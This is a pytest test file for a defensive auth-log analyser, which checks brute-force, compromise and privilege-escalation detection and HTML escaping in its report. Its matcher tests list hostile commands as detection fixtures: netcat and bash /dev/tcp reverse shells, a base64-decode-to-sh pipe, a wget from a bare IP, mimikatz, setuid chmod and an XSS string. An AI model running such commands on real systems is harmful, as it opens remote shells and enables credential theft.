"""Tests for Log Analyser.

Run with:  python -m pytest
"""

import logging
from pathlib import Path

import pytest

import analyser

SAMPLE = Path(__file__).resolve().parent.parent / "samples" / "sample_auth.log"
LOGGER = logging.getLogger("test")


def run_sample(**kwargs):
    return analyser.parse_syslog(str(SAMPLE), LOGGER, **kwargs)


def by_category(findings, category):
    return [f for f in findings if f.category == category]


# Sample log: the attack story

def test_brute_force_detected_once_with_all_usernames():
    brute = by_category(run_sample(), "Brute Force")
    assert len(brute) == 1
    assert "203.0.113.45" in brute[0].description
    assert "11 failed logins" in brute[0].description
    for user in ("admin", "deploy", "oracle", "test", "ubuntu"):
        assert user in brute[0].description


def test_successful_login_after_brute_force_flagged():
    compromise = by_category(run_sample(), "Possible Compromise")
    assert len(compromise) == 1
    assert "'deploy'" in compromise[0].description
    assert compromise[0].severity == "HIGH"


def test_slow_attack_ignored_by_default_but_caught_with_long_window():
    default = by_category(run_sample(), "Brute Force")
    assert not any("198.51.100.77" in f.description for f in default)

    tuned = by_category(run_sample(threshold=3, window=7200), "Brute Force")
    assert any("198.51.100.77" in f.description for f in tuned)


def test_threshold_option_takes_effect():
    assert by_category(run_sample(threshold=20), "Brute Force") == []


def test_one_normal_typo_is_not_a_brute_force():
    findings = run_sample()
    assert not any("alice" in f.description and f.category in ("Brute Force", "Possible Compromise")
                   for f in findings)


def test_every_attacker_action_is_high():
    high = [f.description for f in run_sample() if f.severity == "HIGH"]
    expected = [
        "Download from a bare IP address",
        "Setuid/setgid bit set",
        "New user account created: sysupdate",
        "User added to an admin group",
        "Reverse shell",
    ]
    for text in expected:
        assert any(text in d for d in high), f"missing HIGH finding: {text}"


def test_routine_sudo_is_low():
    nginx = [f for f in run_sample() if "systemctl restart nginx" in f.description]
    assert [f.severity for f in nginx] == ["LOW"]


def test_no_false_positives_from_usernames_or_ordinary_words():
    descriptions = " ".join(f.description for f in run_sample())
    assert "sync once" not in descriptions
    assert "rotate-reports" not in descriptions
    assert "Unknown" not in descriptions


# Matchers

@pytest.mark.parametrize("command, severity", [
    ("Started Daily apt download activities, sync once.", None),
    ("/home/john/scripts/rotate-reports.sh", None),
    ("systemctl restart nginx", None),
    ("/usr/bin/john --wordlist=rockyou.txt hashes", "HIGH"),
    ("nc -lvp 4444", "HIGH"),
    ("/bin/nc -e /bin/sh 10.0.0.5 4444", "HIGH"),
    ("bash -i >& /dev/tcp/10.0.0.5/4444 0>&1", "HIGH"),
    ("echo aGVsbG8= | base64 -d | sh", "HIGH"),
    ("wget http://198.51.100.23/x.sh", "HIGH"),
    ("C:\\Tools\\mimikatz.exe privilege::debug", "HIGH"),
    ("curl -fsSL https://get.docker.com", "MEDIUM"),
    ("powershell.exe -enc AAAA", "MEDIUM"),
])
def test_match_suspicious(command, severity):
    result = analyser.match_suspicious(command)
    assert (result[0] if result else None) == severity


@pytest.mark.parametrize("command, flagged", [
    ("chmod 4755 /tmp/x", True),
    ("chmod u+s /bin/bash", True),
    ("chmod 755 /tmp/x", False),
    ("chmod 644 file", False),
    ("chmod +x run.sh", False),
    ("usermod -aG sudo bob", True),
    ("gpasswd -a bob wheel", True),
    ("usermod -aG docker bob", False),
    ("chown root:root /tmp/x", True),
    ("chown alice file", False),
    ("vi /etc/sudoers", True),
])
def test_match_priv_esc(command, flagged):
    assert bool(analyser.match_priv_esc(command)) == flagged


# HTML report

def test_report_escapes_log_content(tmp_path):
    evil = analyser.Finding("Sudo Usage", "LOW", "Nov  1 07:00:00", "x.log",
                            "sudo command executed: <script>alert(1)</script>")
    report = tmp_path / "report.html"
    analyser.generate_html_report([evil], str(report), LOGGER)
    html = report.read_text(encoding="utf-8")
    assert "<script>alert(1)</script>" not in html
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in html
